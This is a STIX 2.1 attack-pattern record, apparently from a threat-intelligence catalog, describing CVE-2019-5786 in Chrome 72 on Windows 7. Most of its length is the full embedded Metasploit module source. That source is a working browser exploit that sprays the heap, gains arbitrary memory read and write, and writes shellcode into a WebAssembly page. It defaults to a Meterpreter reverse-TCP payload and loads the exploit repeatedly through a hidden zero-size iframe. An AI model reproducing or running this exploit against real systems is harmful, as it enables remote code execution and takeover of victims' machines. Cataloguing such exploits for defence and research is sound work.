{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b4419fb0-e156-4872-98a5-1d2afc4caff7",
    "created": "2024-08-14T16:41:31.526552Z",
    "modified": "2024-08-14T16:41:31.526556Z",
    "name": "Chrome 72.0.3626.119 FileReader UaF exploit for Windows 7 x86",
    "description": " This exploit takes advantage of a use after free vulnerability in Google Chrome 72.0.3626.119 running on Windows 7 x86. The FileReader.readAsArrayBuffer function can return multiple references to the same ArrayBuffer object, which can be freed and overwritten with sprayed objects. The dangling ArrayBuffer reference can be used to access the sprayed objects allowing arbitrary memory access from Javascript. This is used to write and execute shellcode in a WebAssembly object. The shellcode is executed within the Chrome sandbox, so you must explicitly disable the sandbox for the payload to be successful.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/chrome_filereader_uaf.rb",
            "external_id": "chrome_filereader_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5786"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/exodusintel/CVE-2019-5786"
        },
        {
            "source_name": "reference",
            "url": "https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/"
        },
        {
            "source_name": "reference",
            "url": "https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/"
        },
        {
            "source_name": "reference",
            "url": "https://security.googleblog.com/2019/03/disclosing-vulnerabilities-to-protect.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Chrome 72.0.3626.119 FileReader UaF exploit for Windows 7 x86',\n      'Description'    => %q{\n        This exploit takes advantage of a use after free vulnerability in Google\n      Chrome 72.0.3626.119 running on Windows 7 x86.\n        The FileReader.readAsArrayBuffer function can return multiple references to the\n      same ArrayBuffer object, which can be freed and overwritten with sprayed objects.\n      The dangling ArrayBuffer reference can be used to access the sprayed objects,\n      allowing arbitrary memory access from Javascript. This is used to write and\n      execute shellcode in a WebAssembly object.\n        The shellcode is executed within the Chrome sandbox, so you must explicitly\n      disable the sandbox for the payload to be successful.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n          'Clement Lecigne', # discovery\n          'Istv\u00e1n Kurucsai', # Exodus Intel\n          'timwr',           # metasploit module\n        ],\n      'References'     => [\n          ['CVE', '2019-5786'],\n          ['URL', 'https://github.com/exodusintel/CVE-2019-5786'],\n          ['URL', 'https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/'],\n          ['URL', 'https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/'],\n          ['URL', 'https://security.googleblog.com/2019/03/disclosing-vulnerabilities-to-protect.html'],\n        ],\n      'Arch'           => [ ARCH_X86 ],\n      'Platform'       => 'windows',\n      'DefaultTarget'  => 0,\n      'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' },\n      'Targets'        => [ [ 'Automatic', { } ] ],\n      'DisclosureDate' => '2019-03-21'))\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Sending #{request.uri}\")\n    if request.uri =~ %r{/exploit.html$}\n      html = %Q^\n<html>\n    <head>\n        <script>\nlet myWorker = new Worker('worker.js');\nlet reader = null;\nspray = null;               // nested arrays used to hold the sprayed heap contents\nlet onprogress_cnt = 0;     // number of times onprogress was called in a round\nlet try_cnt = 0;            // number of rounds we tried\nlet last = 0, lastlast = 0; // last two AB results from the read\nlet tarray = 0;             // TypedArray constructed from the dangling ArrayBuffer\nconst string_size = 128 * 1024 * 1024;\nlet contents = String.prototype.repeat.call('Z', string_size);\nlet f = new File([contents], \"text.txt\");\nconst marker1 = 0x36313233;\nconst marker2 = 0x37414546;\n\nconst outers = 256;\nconst inners = 1024;\n\nfunction allocate_spray_holders() {\n    spray = new Array(outers);\n    for (let i = 0; i < outers; i++) {\n        spray[i] = new Array(inners);\n    }\n}\n\nfunction clear_spray() {\n    for (let i = 0; i < outers; i++) {\n        for (let j = 0; j < inners; j++) {\n            spray[i][j] = null;\n        }\n    }\n}\n\nfunction reclaim_mixed() {\n    // spray the heap to reclaim the freed region\n    let tmp = {};\n    for (let i = 0; i < outers; i++) {\n        for (let j = 0; j + 2 < inners; j+=3) {\n            spray[i][j] = {a: marker1, b: marker2, c: tmp};\n            spray[i][j].c = spray[i][j]     // self-reference to find our absolute address\n            spray[i][j+1] = new Array(8);\n            spray[i][j+2] = new Uint32Array(32);\n        }\n    }\n}\n\nfunction find_pattern() {\n    const start_offset = 0x00afc000 / 4;\n    for (let i = start_offset; i + 1 < string_size / 4; i++) {\n        if (i < 50){\n            console.log(tarray[i].toString(16));\n        }\n        // multiply by two because of the way SMIs are stored\n        if (tarray[i] == marker1 * 2) {\n            if (tarray[i+1] == marker2 * 2) {\n                console.log(`found possible candidate objectat idx ${i}`);\n                return i;\n            }\n        }\n    }\n    return null;\n}\n\n\nfunction get_obj_idx(prop_idx) {\n    // find the index of the Object in the spray array\n    tarray[prop_idx] = 0x62626262;\n    for (let i = 0; i < outers; i++) {\n        for (let j = 0; j < inners; j+=1) {\n            try {\n                if (spray[i][j].a == 0x31313131) {\n                    console.log(`found object idx in the spray array: ${i} ${j}`);\n                    return spray[i][j];\n                }\n            } catch (e) {}\n        }\n    }\n}\n\nfunction ta_read(addr) {\n    // reads an absolute address through the original freed region\n    // only works for ta_absolute_addr + string_size (128MiB)\n    if (addr > ta_absolute_addr && addr < ta_absolute_addr + string_size) {\n        return tarray[(addr-ta_absolute_addr)/4];\n    }\n\n    return 0;\n}\n\nfunction ta_write(addr, value) {\n    // wrtie to an absolute address through the original freed region\n    // only works for ta_absolute_addr + string_size (128MiB)\n    if (addr % 4 || value > 2**32 - 1 ||\n        addr < ta_absolute_addr ||\n        addr > ta_absolute_addr + string_size) {\n        console.log(`invalid args passed to ta_write(${addr.toString(16)}, ${value}`);\n    }\n    tarray[(addr-ta_absolute_addr)/4] = value;\n}\n\nfunction get_corruptable_ui32a() {\n    // finds a sprayed Uint32Array, the elements pointer of which also falls into the controlled region\n    for (let i = 0; i < outers; i++) {\n        for (let j = 0; j + 2 < inners; j+=3) {\n            let ui32a_addr = addrof(spray[i][j+2]) - 1;\n            let bs_addr = ta_read(ui32a_addr + 12) - 1;\n            let elements_addr = ta_read(ui32a_addr + 8) - 1;\n            // read its elements pointer\n            // if the elements ptr lies inside the region we have access to\n            if (bs_addr >= ta_absolute_addr && bs_addr < ta_absolute_addr + string_size &&\n                elements_addr >= ta_absolute_addr && elements_addr < ta_absolute_addr + string_size) {\n                console.log(`found corruptable Uint32Array->elements at ${bs_addr.toString(16)}, on Uint32Array idx ${i} ${j}`);\n                return {\n                    bs_addr: bs_addr,\n                    elements_addr: elements_addr,\n                    ui32: spray[i][j+2],\n                    i: i, j: j\n                }\n            }\n        }\n    }\n}\n\nvar reader_obj = null;\nvar object_prop_taidx = null;\nvar ta_absolute_addr = null;\nvar aarw_ui32 = null;\n\nfunction addrof(leaked_obj) {\n    reader_obj.a = leaked_obj;\n    return tarray[object_prop_taidx];\n}\n\n\nfunction read4(addr) {\n    // save the old values\n    let tmp1 = ta_read(aarw_ui32.elements_addr + 12);\n    let tmp2 = ta_read(aarw_ui32.bs_addr + 16);\n\n    // rewrite the backing store ptr\n    ta_write(aarw_ui32.elements_addr + 12, addr);\n    ta_write(aarw_ui32.bs_addr + 16, addr);\n\n    let val = aarw_ui32.ui32[0];\n\n    ta_write(aarw_ui32.elements_addr + 12, tmp1);\n    ta_write(aarw_ui32.bs_addr + 16, tmp2);\n\n    return val;\n}\n\nfunction write4(addr, val) {\n    // save the old values\n    let tmp1 = ta_read(aarw_ui32.elements_addr + 12);\n    let tmp2 = ta_read(aarw_ui32.bs_addr + 16);\n\n    // rewrite the backing store ptr\n    ta_write(aarw_ui32.elements_addr + 12, addr);\n    ta_write(aarw_ui32.bs_addr + 16, addr);\n\n    aarw_ui32.ui32[0] = val;\n\n    ta_write(aarw_ui32.elements_addr + 12, tmp1);\n    ta_write(aarw_ui32.bs_addr + 16, tmp2);\n}\n\nfunction get_rw() {\n    // free up as much memory as possible\n    // spray = null;\n    // contents = null;\n    force_gc();\n\n    // attepmt reclaiming the memory pointed to by dangling pointer\n    reclaim_mixed();\n\n    // access the reclaimed region as a Uint32Array\n    tarray = new Uint32Array(lastlast);\n    object_prop_taidx = find_pattern();\n    if (object_prop_taidx === null) {\n        console.log('ERROR> failed to find marker');\n        window.top.postMessage(`ERROR> failed to find marker`, '*');\n        return;\n    }\n\n    // leak the absolute address of the Object\n    const obj_absolute_addr = tarray[object_prop_taidx + 2] - 1;  // the third property of the sprayed Object is self-referential\n    ta_absolute_addr = obj_absolute_addr - (object_prop_taidx-3)*4\n    console.log(`leaked absolute address of our object ${obj_absolute_addr.toString(16)}`);\n    console.log(`leaked absolute address of ta ${ta_absolute_addr.toString(16)}`);\n\n    reader_obj = get_obj_idx(object_prop_taidx);\n    if (reader_obj == undefined) {\n        console.log(`ERROR> failed to find object`);\n        window.top.postMessage(`ERROR> failed to find object`, '*');\n        return;\n    }\n    // now reader_obj is a reference to the Object, object_prop_taidx is the index of its first inline property from the beginning of tarray\n\n    console.log(`addrof(reader_obj) == ${addrof(reader_obj)}`);\n    aarw_ui32 = get_corruptable_ui32a();\n    // arbitrary read write up after this point\n}\n\nvar wfunc = null;\nlet meterpreter = unescape(\"#{Rex::Text.to_unescape(payload.encoded)}\");\n\nfunction rce() {\n    function get_wasm_func() {\n        var importObject = {\n            imports: { imported_func: arg => console.log(arg) }\n        };\n        bc = [0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x8, 0x2, 0x60, 0x1, 0x7f, 0x0, 0x60, 0x0, 0x0, 0x2, 0x19, 0x1, 0x7, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0xd, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x0, 0x3, 0x2, 0x1, 0x1, 0x7, 0x11, 0x1, 0xd, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x0, 0x1, 0xa, 0x8, 0x1, 0x6, 0x0, 0x41, 0x2a, 0x10, 0x0, 0xb];\n        wasm_code = new Uint8Array(bc);\n        wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);\n        return wasm_mod.exports.exported_func;\n    }\n\n    let wasm_func = get_wasm_func();\n    wfunc = wasm_func;\n    // traverse the JSFunction object chain to find the RWX WebAssembly code page\n    let wasm_func_addr = addrof(wasm_func) - 1;\n    let sfi = read4(wasm_func_addr + 12) - 1;\n    let WasmExportedFunctionData = read4(sfi + 4) - 1;\n    let instance = read4(WasmExportedFunctionData + 8) - 1;\n    let rwx_addr = read4(instance + 0x74);\n\n    // write the shellcode to the RWX page\n    if (meterpreter.length % 2 != 0)\n        meterpreter += \"\\\\u9090\";\n\n    for (let i = 0; i < meterpreter.length; i += 2) {\n        write4(rwx_addr + i*2, meterpreter.charCodeAt(i) + meterpreter.charCodeAt(i + 1) * 0x10000);\n    }\n\n    // if we got to this point, the exploit was successful\n    window.top.postMessage('SUCCESS', '*');\n    console.log('success');\n    wfunc();\n\n    // invoke the shellcode\n    //window.setTimeout(wfunc, 1000);\n}\n\nfunction force_gc() {\n    // forces a garbage collection to avoid OOM kills\n    try {\n        var failure = new WebAssembly.Memory({initial: 32767});\n    } catch(e) {\n        // console.log(e.message);\n    }\n}\n\nfunction init() {\n    abs = [];\n    tarray = 0;\n    onprogress_cnt = 0;\n    try_cnt = 0;\n    last = 0, lastlast = 0;\n    reader = new FileReader();\n\n    reader.onloadend = function(evt) {\n        try_cnt += 1;\n        failure = false;\n        if (onprogress_cnt < 2) {\n            console.log(`less than 2 onprogress events triggered: ${onprogress_cnt}, try again`);\n            failure = true;\n        }\n\n        if (lastlast.byteLength != f.size) {\n            console.log(`lastlast has a different size than expected: ${lastlast.byteLength}`);\n            failure = true;\n        }\n\n        if (failure === true) {\n            console.log('retrying in 1 second');\n            window.setTimeout(exploit, 1);\n            return;\n        }\n\n        console.log(`onloadend attempt ${try_cnt} after ${onprogress_cnt} onprogress callbacks`);\n        try {\n            // trigger the FREE\n            myWorker.postMessage([last], [last, lastlast]);\n        } catch(e) {\n            // an exception with this message indicates that the FREE part of the exploit was successful\n            if (e.message.includes('ArrayBuffer at index 1 could not be transferred')) {\n                get_rw();\n                rce();\n                return;\n            } else {\n                console.log(e.message);\n            }\n        }\n    }\n    reader.onprogress = function(evt) {\n        force_gc();\n        let res = evt.target.result;\n        // console.log(`onprogress ${onprogress_cnt}`);\n        onprogress_cnt += 1;\n        if (res.byteLength != f.size) {\n            // console.log(`result has a different size than expected: ${res.byteLength}`);\n            return;\n        }\n        lastlast = last;\n        last = res;\n    }\n    if (spray === null) {\n        // allocate the spray holders if needed\n        allocate_spray_holders();\n    }\n\n    // clear the spray holder arrays\n    clear_spray();\n\n    // get rid of the reserved ArrayBuffer range, as it may interfere with the exploit\n    try {\n        let failure = new ArrayBuffer(1024 * 1024 * 1024);\n    } catch (e) {\n        console.log(e.message);\n    }\n\n    force_gc();\n}\n\nfunction exploit() {\n    init();\n    reader.readAsArrayBuffer(f);\n    console.log(`attempt ${try_cnt} started`);\n}\n        </script>\n    </head>\n    <body onload=\"exploit()\">\n    </body>\n</html>\n    ^\n      send_response(cli, html)\n    elsif request.uri =~ %r{/worker.js$}\n      send_response(cli, 'onmessage = function (msg) { }')\n    else\n      uripath = datastore['URIPATH'] || get_resource\n      uripath += '/' unless uripath.end_with? '/'\n      html = %Q^\n<html>\n    <head>\n        <script>\n            function iter() {\n                let iframe = null;\n                try {\n                    iframe = document.getElementById('myframe');\n                    document.body.removeChild(iframe);\n                } catch (e) {}\n\n                iframe = document.createElement('iframe');\n                iframe.src = '#{uripath}exploit.html';\n                iframe.id = 'myframe';\n                iframe.style = \"width:0; height:0; border:0; border:none; visibility=hidden\"\n                document.body.appendChild(iframe);\n                console.log(document.getElementById('myframe'));\n            }\n\n            function brute() {\n                window.setTimeout(iter, 1000);\n                let interval = window.setInterval(iter, 15000);\n\n                window.onmessage = function(e) {\n                    if (e.data.includes('SUCCESS')) {\n                        console.log('exploit successful!');\n                        window.clearInterval(interval);\n                    }\n                    console.log(e);\n                }\n            }\n        </script>\n    </head>\n    <body onload=\"brute()\"></body>\n</html>\n    ^\n      send_response(cli, html)\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-03-21",
    "x_mitre_platforms": [
        "windows'"
    ]
}